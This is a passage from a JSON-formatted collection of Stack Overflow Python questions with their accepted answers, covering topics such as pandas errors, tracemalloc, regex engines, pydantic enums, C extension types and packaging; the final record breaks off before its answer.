Numba:         0.33 ms\nKellyBundy's implementation:            0.19 ms\nEfficient algorithm + optim + Numba:    0.10 ms\nFinal implementation (tuned):           0.05 ms\nFinal implementation (default):         0.05 ms\n\nHere is the timing with the large random list on my machine (easy case):\nEfficient algorithm + optim + Numba:    209.61 ms\nFinal implementation (default):           4.11 ms\nKellyBundy's implementation:              1.15 ms\nFinal implementation (tuned):             0.85 ms\n\nOther algorithms are not shown here because they are too slow (see below)\n\nHere is the timing with the big list on my machine (challenging case):\nNaive python algorithm:               >20000 s    [estimation & out of memory]\nNaive algorithm using Numba:            ~900 s    [estimation]\nTail call optimization + Numba:           42.61 s\nKellyBundy's implementation:               0.671 s\nFinal implementation (tuned):              0.078 s\nEfficient algorithm + optim + Numba:       0.051 s\nFinal implementation (default):            0.013 s\n\nThus, the final implementation is up to ~3500 times faster on the small input and more than 1_500_000 times faster on the large input! It also use far less RAM so it can actually be executed on a cheap PC.\nIt is worth noting that the execution time can be reduced even further be using multiple thread so to reach a speed up >5_000_000 though it may be slower on small inputs and it will make the code a bit complex.\n\n"
}
{
    "Id": 71969299,
    "PostTypeId": 1,
    "Title": "How to disable code formatting in ipython?",
    "Body": "IPython has this new feature that reformats my prompt. Unfortunately, it is really buggy, so I want to disable it. I managed to do it when starting IPython from the command line by adding the following line in my ipython_config.py:\nc.TerminalInteractiveShell.autoformatter = None\n\nHowever, it does not work when I run it from a python script. I start IPython from my script the following way:\nc = traitlets.config.get_config()\nc.InteractiveShellEmbed.colors = \"Linux\"\nc.TerminalInteractiveShell.autoformatter = None\nc.InteractiveShellEmbed.loop_runner = lambda coro: loop.run_until_complete(coro)\nIPython.embed(display_banner='', using='asyncio', config=c)\n\nIf I change the colors value, the colors change accordingly, so the configuration itself works. However, no matter what I do with autoformatter, IPython autoformats my code regardless. What am I doing wrong?\n",
    "AcceptedAnswerId": 71995927,
    "AcceptedAnswer": "Apparently, the answer is:\nc.InteractiveShellEmbed.autoformatter = None\n\n"
}
{
    "Id": 71424233,
    "PostTypeId": 1,
    "Title": "How do I list my scheduled queries via the Python google client API?",
    "Body": "I have set up my service account and I can run queries on bigQuery using client.query().\nI could just write all my scheduled queries into this new client.query() format but I already have many scheduled queries so I was wondering if there is a way I can get/list the scheduled queries and then use that information to run those queries from a script.\n\n",
    "AcceptedAnswerId": 71428499,
    "AcceptedAnswer": "Yes, you can use the APIs. When you don't know which one to use, I have a tip. Use the command proposed by @Yev\nbq ls --transfer_config --transfer_location=US --format=prettyjson\nBut log the API calls. for that use the --apilog  parameter like that\nbq --apilog ./log ls --transfer_config --transfer_location=US --format=prettyjson\nAnd, magically, you can find the API called by the command:\nhttps://bigquerydatatransfer.googleapis.com/v1/projects//locations/US/transferConfigs?alt=json\nThen, a simple google search leads you to the correct documentation\n\nIn python, add that dependencies in your requirements.txt: google-cloud-bigquery-datatransfer and use that code\nfrom google.cloud import bigquery_datatransfer\n\nclient = bigquery_datatransfer.DataTransferServiceClient()\nparent = client.common_project_path(\"\")\nresp = client.list_transfer_configs(parent=parent)\nprint(resp)\n\n"
}
{
    "Id": 71577514,
    "PostTypeId": 1,
    "Title": "ValueError: Per-column arrays must each be 1-dimensional when trying to create a pandas DataFrame from a dictionary. Why?",
    "Body": "I'm trying to create a very simple Pandas DataFrame from a dictionary. The dictionary has 3 items, and the DataFrame as well. They are:\n\na list with the 'shape' (3,)\na list/np.array (in different attempts) with the shape(3, 3)\na constant of 100 (same value to the whole column)\n\n\nHere is the code that succeeds and displays the preferred df\n\n\u200b\n# from a dicitionary\n>>>dict1 = {\"x\": [1, 2, 3],\n...         \"y\": list(\n...             [\n...                 [2, 4, 6], \n...                 [3, 6, 9], \n...                 [4, 8, 12]\n...             ]\n...             ),\n...         \"z\": 100}\n\n>>>df1 = pd.DataFrame(dict1)\n>>>df1\n   x           y    z\n0  1   [2, 4, 6]  100\n1  2   [3, 6, 9]  100\n2  3  [4, 8, 12]  100\n\n\nBut then I assign a Numpy ndarray (shape 3, 3 )to the key y, and try to create a DataFrame from the dictionary. The line I try to create the DataFrame errors out. Below is the code I try to run, and the error I get (in separate code blocks for ease of reading.)\n\n\ncode\n\n\u200b\n>>>dict2 = {\"x\": [1, 2, 3],\n...         \"y\": np.array(\n...             [\n...                 [2, 4, 6], \n...                 [3, 6, 9], \n...                 [4, 8, 12]\n...             ]\n...             ),\n...         \"z\": 100}\n\n>>>df2 = pd.DataFrame(dict2)  # see the below block for error\n\n\nerror\n\n\u200b\n---------------------------------------------------------------------------\nValueError                                Traceback (most recent call last)\nd:\\studies\\compsci\\pyscripts\\study\\pandas-realpython\\data-delightful\\01.intro.ipynb Cell 10' in \n      1 # from a dicitionary\n      2 dict1 = {\"x\": [1, 2, 3],\n      3          \"y\": np.array(\n      4              [\n   (...)\n      9              ),\n     10          \"z\": 100}\n---> 12 df1 = pd.DataFrame(dict1)\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\frame.py:636, in DataFrame.__init__(self, data, index, columns, dtype, copy)\n    630     mgr = self._init_mgr(\n    631         data, axes={\"index\": index, \"columns\": columns}, dtype=dtype, copy=copy\n    632     )\n    634 elif isinstance(data, dict):\n    635     # GH#38939 de facto copy defaults to False only in non-dict cases\n--> 636     mgr = dict_to_mgr(data, index, columns, dtype=dtype, copy=copy, typ=manager)\n    637 elif isinstance(data, ma.MaskedArray):\n    638     import numpy.ma.mrecords as mrecords\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\internals\\construction.py:502, in dict_to_mgr(data, index, columns, dtype, typ, copy)\n    494     arrays = [\n    495         x\n    496         if not hasattr(x, \"dtype\") or not isinstance(x.dtype, ExtensionDtype)\n    497         else x.copy()\n    498         for x in arrays\n    499     ]\n    500     # TODO: can we get rid of the dt64tz special case above?\n--> 502 return arrays_to_mgr(arrays, columns, index, dtype=dtype, typ=typ, consolidate=copy)\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\internals\\construction.py:120, in arrays_to_mgr(arrays, columns, index, dtype, verify_integrity, typ, consolidate)\n    117 if verify_integrity:\n    118     # figure out the index, if necessary\n    119     if index is None:\n--> 120         index = _extract_index(arrays)\n    121     else:\n    122         index = ensure_index(index)\n\nFile ~\\anaconda3\\envs\\dst\\lib\\site-packages\\pandas\\core\\internals\\construction.py:661, in _extract_index(data)\n    659         raw_lengths.append(len(val))\n    660     elif isinstance(val, np.ndarray) and val.ndim > 1:\n--> 661         raise ValueError(\"Per-column arrays must each be 1-dimensional\")\n    663 if not indexes and not raw_lengths:\n    664     raise ValueError(\"If using all scalar values, you must pass an index\")\n\nValueError: Per-column arrays must each be 1-dimensional\n\nWhy is it ending in error like that in the second attempt, even though the dimensions of both arrays are the same? What is a workaround for this issue?\n",
    "AcceptedAnswerId": 71580136,
    "AcceptedAnswer": "If you look closer at the error message and quick look at the source code here:\n    elif isinstance(val, np.ndarray) and val.ndim > 1:\n        raise ValueError(\"Per-column arrays must each be 1-dimensional\")\n\nYou will find that if the dictionay value is a numpy array and has more than one dimension as your example, it throws an error based on the source code. Therefore, it works very well with list because a list has no more than one dimension even if it is a list of list.\nlst = [[1,2,3],[4,5,6],[7,8,9]]\nlen(lst) # print 3 elements or (3,) not (3,3) like numpy array.\n\nYou can try to use np.array([1,2,3]), it will work because number of dimensions is 1 and try:\narr = np.array([1,2,3])\nprint(arr.ndim)  # output is 1\n\nIf it is necessary to use numpy array inside a dictionary, you can use .tolist() to convert numpy array to a list.\n"
}
{
    "Id": 72002559,
    "PostTypeId": 1,
    "Title": "Converting object to dictionary key",
    "Body": "I was wondering if there is an easy way to essentially have multiple keys in a dictionary for one value. An example of what I would like to achieve is as following:\nclass test:\n    key=\"test_key\"\n    \n    def __str__(self):\n        return self.key\n\ntester = test()\n\ndictionary = {}\ndictionary[tester] = 1\n\nprint(dictionary[tester])\nprint(dictionary[\"test_key\"])\n\nwhere the output would be:\n>>> 1\n>>> 1\n\nWhat I'm looking for is a way to automatically convert the object to a string before its used as a key. Is this possible?\n",
    "AcceptedAnswerId": 72002684,
    "AcceptedAnswer": "Personally, I think it's better to explicitly cast the object to a string, e.g.\ndictionary[str(tester)] = 1\n\nThat being said, if you're really really REALLY sure you want to do this, define the __hash__ and __eq__ dunder methods. No need to create a new data structure or change the existing code outside of the class definition:\nclass test:\n    key=\"test_key\"\n    \n    def __hash__(self):\n        return hash(self.key)\n        \n    def __eq__(self, other):\n        if isinstance(other, str):\n            return self.key == other\n        return self.key == other.key\n    \n    def __str__(self):\n        return self.key\n\nThis will output:\n1\n1\n\n"
}
{
    "Id": 71583528,
    "PostTypeId": 1,
    "Title": "Python extracting string",
    "Body": "I have a dataframe where one of the columns which is in string format looks like this\n    filename\n 0  Machine02-2022-01-28_00-21-45.blf.424\n 1  Machine02-2022-01-28_00-21-45.blf.425\n 2  Machine02-2022-01-28_00-21-45.blf.426\n 3  Machine02-2022-01-28_00-21-45.blf.427\n 4  Machine02-2022-01-28_00-21-45.blf.428\n\nI want my column to look like this\n      filename\n 0    2022-01-28 00-21-45 424\n 1    2022-01-28 00-21-45 425\n 2    2022-01-28 00-21-45 426\n 3    2022-01-28 00-21-45 427\n 4    2022-01-28 00-21-45 428\n\nI tried this code\ndf['filename'] = df['filename'].str.extract(r\"(\\d{4}-\\d{1,2}-\\d{1,2})_(\\d{2}-\\d{2}-\\d{2}).*\\.(\\d+)\", r\"\\1 \\2 \\3\")\n\nI am getting this error, unsupported operand type(s) for &: 'str' and 'int'.\nCan anyone please tell me where I am doing wrong ?\n",
    "AcceptedAnswerId": 71583643,
    "AcceptedAnswer": "please try this:\ndf['filename'] = df['filename'].str.split('-',1).apply(lambda x:' '.join(x[1].split('_')).replace('.blf.',' '))\n\n"
}
{
    "Id": 71452013,
    "PostTypeId": 1,
    "Title": "Does Python not reuse memory here? What does tracemalloc's output mean?",
    "Body": "I create a list of a million int objects, then replace each with its negated value. tracemalloc reports 28 MB extra memory (28 bytes per new int object). Why? Does Python not reuse the memory of the garbage-collected int objects for the new ones? Or am I misinterpreting the tracemalloc results? Why does it say those numbers, what do they really mean here?\nimport tracemalloc\n\nxs = list(range(10**6))\ntracemalloc.start()\nfor i, x in enumerate(xs):\n    xs[i] = -x\nprint(tracemalloc.get_traced_memory())\n\nOutput (Try it online!):\n(27999860, 27999972)\n\nIf I replace xs[i] = -x with x = -x (so the new object rather than the original object gets garbage-collected), the output is a mere (56, 196) (try it). How does it make any difference which of the two objects I keep/lose?\nAnd if I do the loop twice, it still only reports (27992860, 27999972) (try it). Why not 56 MB? How is the second run any different for this than the first?\n",
    "AcceptedAnswerId": 71481334,
    "AcceptedAnswer": "Short Answer\ntracemalloc was started too late to track the inital block of memory, so it\ndidn't realize it was a reuse. In the example you gave, you free 27999860 bytes\nand allocate 27999860 bytes, but tracemalloc can't 'see' the free. Consider the\nfollowing, slightly modified example:\nimport tracemalloc\n\ntracemalloc.start()\n\nxs = list(range(10**6))\nprint(tracemalloc.get_traced_memory())\nfor i, x in enumerate(xs):\n    xs[i] = -x\nprint(tracemalloc.get_traced_memory())\n\nOn my machine (python 3.10, but same allocator), this displays:\n(35993436, 35993436)\n(36000576, 36000716)\n\nAfter we allocate xs, the system has allocated 35993436 bytes, and after we run\nthe loop we have a net total of 36000576. This shows that the memory usage isn't\nactually increasing by 28 Mb.\nWhy does it behave this way?\nTracemalloc works by overriding the standard internal methods for allocating\nwith tracemalloc_alloc, and the similar free and realloc methods. Taking a\npeek at the source:\nstatic void*\ntracemalloc_alloc(int use_calloc, void *ctx, size_t nelem, size_t elsize)\n{\n    PyMemAllocatorEx *alloc = (PyMemAllocatorEx *)ctx;\n    void *ptr;\n\n    assert(elsize == 0 || nelem <= SIZE_MAX / elsize);\n\n    if (use_calloc)\n        ptr = alloc->calloc(alloc->ctx, nelem, elsize);\n    else\n        ptr = alloc->malloc(alloc->ctx, nelem * elsize);\n    if (ptr == NULL)\n        return NULL;\n\n    TABLES_LOCK();\n    if (ADD_TRACE(ptr, nelem * elsize) < 0) {\n        /* Failed to allocate a trace for the new memory block */\n        TABLES_UNLOCK();\n        alloc->free(alloc->ctx, ptr);\n        return NULL;\n    }\n    TABLES_UNLOCK();\n    return ptr;\n}\n\nWe see that the new allocator does two things:\n1.) Call out to the \"old\" allocator to get memory\n2.) Add a trace to a special table, so we can track this memory\nIf we look at the associated free functions, it's very similar:\n1.) free the memory\n2.) Remove the trace from the table\nIn your example, you allocated xs before you called tracemalloc.start(), so\nthe trace records for this allocation are never put in the memory tracking\ntable. Therefore, when you call free on the initial array data, the traces aren't removed, and thus your weird allocation behavior.\nWhy is the total memory usage 36000000 bytes and not 28000000\nLists in python are weird. They're actually a list of pointer to individually\nallocated objects. Internally, they look like this:\ntypedef struct {\n    PyObject_HEAD\n    Py_ssize_t ob_size;\n\n    /* Vector of pointers to list elements.  list[0] is ob_item[0], etc. */\n    PyObject **ob_item;\n\n    /* ob_item contains space for 'allocated' elements.  The number\n     * currently in use is ob_size.\n     * Invariants:\n     *     0 <= ob_size <= allocated\n     *     len(list) == ob_size\n     *     ob_item == NULL implies ob_size == allocated == 0\n     */\n    Py_ssize_t allocated;\n} PyListObject;\n\nPyObject_HEAD is a macro that expands to some header information all python\nvariables have. It is just 16 bytes, and contains pointers to type data.\nImportantly, a list of integers is actually a list of pointer to PyObjects\nthat happen to be ints. On the line xs = list(range(10**6)), we expect to\nallocate:\n\n1 PyListObject with internal size 1000000 -- true size:\n\nsizeof(PyObject_HEAD) + sizeof(PyObject *) * 1000000 + sizeof(Py_ssize_t)\n(     16 bytes      ) + (    8 bytes     ) * 1000000 + (     8 bytes    )\n8000024 bytes\n\n\n1000000 PyObject ints (A PyLongObject in the underlying implmentation)\n\n1000000 * sizeof(PyLongObject)\n1000000 * (     28 bytes     )\n28000000 bytes\n\nFor a grand total of 36000024 bytes. That number looks pretty farmiliar!\nWhen you overwrite a value in the array, your just freeing the old value, and updating the pointer in PyListObject->ob_item. This means the array structure is allocated once, takes up 8000024 bytes, and lives to the end of the program. Additionally, 1000000 Integer objects are each allocated, and references are put in the array. They take up the 28000000 bytes. One by one, they are deallocated, and then the memory is used to reallocate a new object in the loop. This is why multiple loops don't increase the amount of memory.\n"
}
{
    "Id": 71290699,
    "PostTypeId": 1,
    "Title": "Is it possible to connect to AuraDB with neomodel?",
    "Body": "Is it possible to connect to AuraDB with neomodel?\nAuraDB connection URI is like neo4j+s://xxxx.databases.neo4j.io.\nThis is not contained user/password information.\nHowever, connection config of neomodel is bolt and it is contained user/password information.\nconfig.DATABASE_URL = 'bolt://neo4j:password@localhost:7687'\n",
    "AcceptedAnswerId": 71311469,
    "AcceptedAnswer": "Connecting to neo4j Aura uses neo4j+s protocol so you need to use the provided uri by Aura.\nReference: https://neo4j.com/developer/python/#driver-configuration\nIn example below; you can set the database url by setting the userid and password along with the uri. It works for me so it should also work for you.\nfrom neomodel import config\n\nuser = 'neo4j'\npsw = 'awesome_password'\nuri = 'awesome.databases.neo4j.io'\n    \nconfig.DATABASE_URL = 'neo4j+s://{}:{}@{}'.format(user, psw, uri)\nprint(config.DATABASE_URL)\n\nResult: \n\n   neo4j+s://neo4j:awesome_password@awesome.databases.neo4j.io\n\n"
}
{
    "Id": 71669583,
    "PostTypeId": 1,
    "Title": "Is there a converse to `operator.contains`?",
    "Body": "edit: I changed the title from complement to converse after the discussion below.\nIn the operator module, the binary functions comparing objects take two parameters. But the contains function has them swapped.\nI use a list of operators, e.g. operator.lt, operator.ge.\nThey take 2 arguments, a and b.\nI can say operator.lt(a, b) and it will tell me whether a is less than b.\nBut with operator.contains, I want to know whether b contains a so I have to swap the arguments.\nThis is a pain because I want a uniform interface, so I can have a user defined list of operations to use (I'm implementing something like Django QL).\nI know I could create a helper function which swaps the arguments:\ndef is_contained_by(a, b):\n    return operator.contains(b, a)\n\nIs there a \"standard\" way to do it?\nAlternatively, I can implement everything backwards, except contains. So map lt to ge, etc, but that gets really confusing.\n",
    "AcceptedAnswerId": 71669777,
    "AcceptedAnswer": "If either of them posts an answer, you should accept that, but between users @chepner and @khelwood, they gave you most of the answer.\nThe complement of operator.contains would be something like operator.does_not_contain, so that's not what you're looking for exactly. Although I think a 'reflection' isn't quite what you're after either, since that would essentially be its inverse, if it were defined.\nAt any rate, as @chepner points out, contains is not backwards. It just not the same as in, in would be is_contained_by as you defined it.\nConsider that a in b would not be a contains b, but rather b contains a, so the signature of operator.contains makes sense. It follows the convention of the function's stated infix operation being its name. I.e. (a  and b contains a == operator.contains(b, a) == (a in b). (in a world where contains would be an existing infix operator)\nAlthough I wouldn't recommend it, because it may cause confusion with others reading your code and making the wrong assumptions, you could do something like:\noperator.in_ = lambda a, b: b.__contains__(a)\n# or\noperator.in_ = lambda a, b: operator.contains(b, a)\n\nThat would give you an operator.in_ that works as you expect (and avoids the in keyword), but at the cost of a little overhead and possible confusion. I'd recommend working with operator.contains instead.\n"
}
{
    "Id": 71486255,
    "PostTypeId": 1,
    "Title": "How can I make Python re work like grep for repeating groups?",
    "Body": "I have the following string:\nseq = 'MNRYLNRQRLYNMYRNKYRGVMEPMSRMTMDFQGRYMDSQGRMVDPRYYDHYGRMHDYDRYYGRSMFNQGHSMDSQRYGGWMDNPERYMDMSGYQMDMQGRWMDAQGRYNNPFSQMWHSRQGH'\n\nalso saved in a file called seq.dat. If I use the following grep command\ngrep '\\([MF]D.\\{4,6\\}\\)\\{3,10\\}' seq.dat\n\nI get the following matching string:\nMDNPERYMDMSGYQMDMQGRWMDAQGRYN\n\nwhich is what I want. In words, what I want to match is as many consecutive repeats as the string has of [MF]D.{4,6}. I don't want to match cases where it has less than 3 consecutive repeats, but I want it to be able to capture up to 6.\nNow, I'm trying to do this with python. I have\np = re.compile(\"(?:[MF]D.{4,6}){3,10}\")\n\nTrying search() returns\nMDNPERYMDMSGYQMDMQGRWM\n\nIt is the close to the answer I seek, but is still missing the last MDAQGRYN. I'm guessing this is because .{4,6} matches the M, which in turn prevents {3,10} from capturing this 4th occurence of ([MF]D.{4,6}), but since I asked for at least 3, it's happy and it stops.\nHow do I make Python regex behave like grep does?\n",
    "AcceptedAnswerId": 71487029,
    "AcceptedAnswer": "There is a fundamental difference between POSIX (\"text-directed\") and NFA (\"regex-directed\") engines. POSIX engines (grep here uses a POSIX BRE regex flavor, it is the flavor used by default) will parse the input text applying the regex to it and return the longest match possible. NFA engine (Python re engine is an NFA engine) here does not re-consume (backtrack) when the subsequent pattern parts match.\nSee reference on regex-directed and text-directed engines:\n\nA regex-directed engine walks through the regex, attempting to match the next token in the regex to the next character. If a match is found, the engine advances through the regex and the subject string. If a token fails to match, the engine backtracks to a previous position in the regex and the subject string where it can try a different path through the regex... Modern regex flavors using regex-directed engines have lots of features such as atomic grouping and possessive quantifiers that allow you to control this backtracking.\nA text-directed engine walks through the subject string, attempting all permutations of the regex before advancing to the next character in the string. A text-directed engine never backtracks. Thus, there isn\u2019t much to discuss about the matching process of a text-directed engine. In most cases, a text-directed engine finds the same matches as a regex-directed engine.\n\nThe last sentence says \"in most cases\", but not all cases, and yours is a good illustration that discrepances may occur.\nTo avoid consuming M or F that are immediately followed with D, I'd suggest using\n(?:[MF]D(?:(?![MF]D).){4,6}){3,10}\n\nSee the regex demo. Details:\n\n(?: - start of an outer non-capturing container group:\n\n[MF]D - M or F and then D\n(?:(?![MF]D).){4,6} - any char (other than a line break) repeated four to six times, that does not start an MD or FD char sequence\n\n\n){3,10} - end of the outer group, repeat 3 to 10 times.\n\nBy the way, if you only want to match uppercase ASCII letters, replace the . with [A-Z].\n"
}
{
    "Id": 71690992,
    "PostTypeId": 1,
    "Title": "Cannot install latest version of Numpy (1.22.3)",
    "Body": "I am trying to install the latest version of numpy, the 1.22.3, but it looks like pip is not able to find this last release.\nI know I can install it locally from the source code, but I want to understand why I cannot install it using pip.\nPS: I have the latest version of pip, the 22.0.4\nERROR: Could not find a version that satisfies the requirement numpy==1.22.3 (from versions: 1.3.0, 1.4.1, 1.5.0, 1.5.1, 1.6.0, 1.6.1, 1.6.2, 1.7.0, 1.7.1, 1.7.2, 1.8.0, 1.8.1, 1.8.2, 1.9.0, 1.9.1, 1.9.2, 1.9.3, 1.10.0.post2, 1.10.1, 1.10.2, 1.10.4, 1.11.0, 1.11.1, 1.11.2, 1.11.3, 1.12.0, 1.12.1, 1.13.0rc1, 1.13.0rc2, 1.13.0, 1.13.1, 1.13.3, 1.14.0rc1, 1.14.0, 1.14.1, 1.14.2, 1.14.3, 1.14.4, 1.14.5, 1.14.6, 1.15.0rc1, 1.15.0rc2, 1.15.0, 1.15.1, 1.15.2, 1.15.3, 1.15.4, 1.16.0rc1, 1.16.0rc2, 1.16.0, 1.16.1, 1.16.2, 1.16.3, 1.16.4, 1.16.5, 1.16.6, 1.17.0rc1, 1.17.0rc2, 1.17.0, 1.17.1, 1.17.2, 1.17.3, 1.17.4, 1.17.5, 1.18.0rc1, 1.18.0, 1.18.1, 1.18.2, 1.18.3, 1.18.4, 1.18.5, 1.19.0rc1, 1.19.0rc2, 1.19.0, 1.19.1, 1.19.2, 1.19.3, 1.19.4, 1.19.5, 1.20.0rc1, 1.20.0rc2, 1.20.0, 1.20.1, 1.20.2, 1.20.3, 1.21.0rc1, 1.21.0rc2, 1.21.0, 1.21.1, 1.21.2, 1.21.3, 1.21.4, 1.21.5)\nERROR: No matching distribution found for numpy==1.22.3\n\n",
    "AcceptedAnswerId": 71691188,
    "AcceptedAnswer": "Please check your Python version. Support for Python 3.7 is dropped since Numpy 1.22.0 release. [source]\n"
}
{
    "Id": 71178416,
    "PostTypeId": 1,
    "Title": "Can you safely change a Python object's type in a C extension?",
    "Body": "Question\nSuppose that I have implemented two Python types using the C extension API and that the types are identical (same data layouts/C struct) with the exception of their names and a few methods. Assuming that all methods respect the data layout, can you safely change the type of an object from one of these types into the other in a C function?\nNotably, as of Python 3.9, there appears to be a function Py_SET_TYPE, but the documentation is not clear as to whether/when this is safe to do. I'm interested in knowing both how to use this function safely and whether types can be safely changed prior to version 3.9.\nMotivation\nI'm writing a Python C extension to implement a Persistent Hash Array Mapped Trie (PHAMT); in case it's useful, the source code is here (as of writing, it is at this commit). A feature I would like to add is the ability to create a Transient Hash Array Mapped Trie (THAMT) from a PHAMT. THAMTs can be created from PHAMTs in O(1) time and can be mutated in-place efficiently. Critically, THAMTs have the exact same underlying C data-structure as PHAMTs\u2014the only real difference between a PHAMT and a THAMT is a few methods encapsulated by their Python types. This common structure allows one to very efficiently turn a THAMT back into a PHAMT once one has finished performing a set of edits. (This pattern typically reduces the number of memory allocations when performing a large number of updates to a PHAMT).\nA very convenient way to implement the conversion from THAMT to PHAMT would be to simply change the type pointers of the THAMT objects from the THAMT type to the PHAMT type. I am confident that I can write code that safely navigates this change, but I can imagine that doing so might, for example, break the Python garbage collector.\n(To be clear: the motivation is just context as to how the question arose. I'm not looking for help implementing the structures described in the Motivation, I'm looking for an answer to the Question, above.)\n",
    "AcceptedAnswerId": 71316603,
    "AcceptedAnswer": "The supported way\nIt is officially possible to change an object's type in Python, as long as the memory layouts are compatible... but this is mostly limited to types not implemented in C. With some restrictions, it is possible to do\n# Python attribute assignment, not C struct member assignment\nobj.__class__ = some_new_class\n\nto change an object's class, with one of the restrictions being that both the old and new classes must be \"heap types\", which all classes implemented in Python are and most classes implemented in C are not. (types.ModuleType and subclasses of that type are also specifically permitted, despite types.ModuleType not being a heap type. See the source for exact restrictions.)\nIf you want to create a heap type from C, you can, but the interface is pretty different from the normal way of defining Python types from C. Plus, for __class__ assignment to work, you have to not set the Py_TPFLAGS_IMMUTABLETYPE flag, and that means that people will be able to monkey-patch your classes in ways you might not like (or maybe you see that as an upside).\nIf you want to go that route, I suggest looking at the CPython 3.10 _functools module source code for an example. (They set the Py_TPFLAGS_IMMUTABLETYPE flag, which you'll have to make sure not to do.)\n\nThe unsupported way\nThere was an attempt at one point to allow __class__ assignment for non-heap types, as long as the memory layouts worked. It got abandoned because it caused problems with some built-in immutable types, where the interpreter likes to reuse instances. For example, allowing (1).__class__ = SomethingElse would have caused a lot of problems. You can read more in the big comment in the source code for the __class__ setter. (The comment is slightly out of date, particularly regarding the Py_TPFLAGS_IMMUTABLETYPE flag, which was added after the comment was written.)\nAs far as I know, this was the only problem, and I don't think any more problems have been added since then. The interpreter isn't going to aggressively reuse instances of your classes, so as long as you're not doing anything like that, and the memory layouts are compatible, I think changing the type of your objects should work for now, even for non-heap-types. However, it is not officially supported, so even if I'm right about this working for now, there's no guarantee it'll keep working.\nPy_SET_TYPE only sets an object's type pointer. It doesn't do any refcount fixing that might be needed. It's a very low-level operation. If neither the old class nor the new class are heap types, no extra refcount fixing is needed, but if the old class is a heap type, you will have to decref the old class, and if the new class is a heap type, you will have to incref the new class.\nIf you need to decref the old class, make sure to do it after changing the object's class and possibly incref'ing the new class.\n"
}
{
    "Id": 72071447,
    "PostTypeId": 1,
    "Title": "Python Enum and Pydantic : accept enum member's composition",
    "Body": "I have an enum :\nfrom enum import Enum\n\nclass MyEnum(Enum):\n    val1 = \"val1\"\n    val2 = \"val2\"\n    val3 = \"val3\"\n\nI would like to validate a pydantic field based on that enum.\nfrom pydantic import BaseModel\n\nclass MyModel(BaseModel):\n    my_enum_field: MyEnum\n\nBUT I would like this validation to also accept string that are composed by the Enum members.\nSo for example : \"val1_val2_val3\" or \"val1_val3\" are valid input.\nI cannot make this field as a string field with a validator since I use a test library (hypothesis and pydantic-factories) that needs this type in order to render one of the values from the enum (for mocking random inputs)\nSo this :\nfrom pydantic import BaseModel, validator\n\nclass MyModel(BaseModel):\n    my_enum_field: str\n\n    @validator('my_enum_field', pre=True)\n    def validate_my_enum_field(cls, value):\n        split_val = str(value).split('_')\n        if not all(v in MyEnum._value2member_map_ for v in split_val):\n            raise ValueError()\n        return value\n\nCould work, but break my test suites because the field is anymore of enum types.\nHow to keep this field as an Enum type (to make my mock structures still valid) and make pydantic accept composite values in the same time ?\nSo far, I tried to dynamically extend the enum, with no success.\n",
    "AcceptedAnswerId": 72072103,
    "AcceptedAnswer": "I looked at this a bit further, and I believe something like this could be helpful. You can create a new class to define the property that is a list of enum values.\nThis class can supply a customized validate method and supply a __modify_schema__ to keep the information present about being a string in the json schema.\nWe can define a base class for generic lists of concatenated enums like this:\nfrom typing import Generic, TypeVar, Type\nfrom enum import Enum\n\nT = TypeVar(\"T\", bound=Enum)\n\n\nclass ConcatenatedEnum(Generic[T], list[T]):\n    enum_type: Type[T]\n\n    @classmethod\n    def __get_validators__(cls):\n        yield cls.validate\n\n    @classmethod\n    def validate(cls, value: str):\n        return list(map(cls.enum_type, value.split(\"_\")))\n\n    @classmethod\n    def __modify_schema__(cls, field_schema: dict):\n        all_values = ', '.join(f\"'{ex.value}'\" for ex in cls.enum_type)\n        field_schema.update(\n            title=f\"Concatenation of {cls.enum_type.__name__} values\",\n            description=f\"Underscore delimited list of values {all_values}\",\n            type=\"string\",\n        )\n        if \"items\" in field_schema:\n            del field_schema[\"items\"]\n\nIn the __modify_schema__ method I also provide a way to generate a description of which values are valid.\nTo use this in your application:\nclass MyEnum(Enum):\n    val1 = \"val1\"\n    val2 = \"val2\"\n    val3 = \"val3\"\n\n\nclass MyEnumList(ConcatenatedEnum[MyEnum]):\n    enum_type = MyEnum\n\n\nclass MyModel(BaseModel):\n    my_enum_field: MyEnumList\n\nExamples Models:\nprint(MyModel.parse_obj({\"my_enum_field\": \"val1\"}))\nprint(MyModel.parse_obj({\"my_enum_field\": \"val1_val2\"}))\n\nmy_enum_field=[]\nmy_enum_field=[, ]\n\nExample Schema:\nprint(json.dumps(MyModel.schema(), indent=2))\n\n{\n  \"title\": \"MyModel\",\n  \"type\": \"object\",\n  \"properties\": {\n    \"my_enum_field\": {\n      \"title\": \"Concatenation of MyEnum values\",\n      \"description\": \"Underscore delimited list of values 'val1', 'val2', 'val3'\",\n      \"type\": \"string\"\n    }\n  },\n  \"required\": [\n    \"my_enum_field\"\n  ]\n}\n\n"
}
{
    "Id": 71193095,
    "PostTypeId": 1,
    "Title": "Questions on pyproject.toml vs setup.py",
    "Body": "Reading up on pyproject.toml, python -m pip install, poetry, flit, etc - I have several questions regarding replacing setup.py with pyproject.toml.\nMy biggest question was - how does a toml file replace a setup.py. Meaning, a toml file can't do everything a py file can. Reading into it, poetry and flit completely replace setup.py with pyproject.toml. While pip uses the pyproject.toml to specify the build tools, but then still uses the setup.py for everything else.\nA good example is, pip currently doesn't have a way to do entry points for console script directly in a toml file, but poetry and flit do.\n\nhttps://flit.readthedocs.io/en/latest/pyproject_toml.html#scripts-section\nhttps://python-poetry.org/docs/pyproject/#scripts\n\nMy main question right now is;\nThe point of pyproject.toml is to provide build system requirement. It is a metadata file. So wouldn't the ideal solution to be to use this file only to specify the build system requirements and still leverage the setup.py for everything else.\nI am confused because I feel like we're losing a lot to over come a fairly simple problem. By entirely doing way with the setup.py and replacing it with pyproject.toml, we lose a lot of helpful things we can do in a setup.py. We can't use a __version.py__, and we lose the ability to automatically create a universal wheel and sdist and upload our packages to PyPi using Twine. which we can currently do in the setup.py file.\nI'm just having a had time wrapping my head around why we would want to completely replace the setup.py with a metadata only file. It seems like using them together is the best of both worlds. We solve the chicken and the egg build system issue, and we get to retain a lot of useful things the setup.py can do.\nWouldn't we need a setup.py to install in Dev mode anyway? Or maybe that is just a pip problem?\n",
    "AcceptedAnswerId": 71717788,
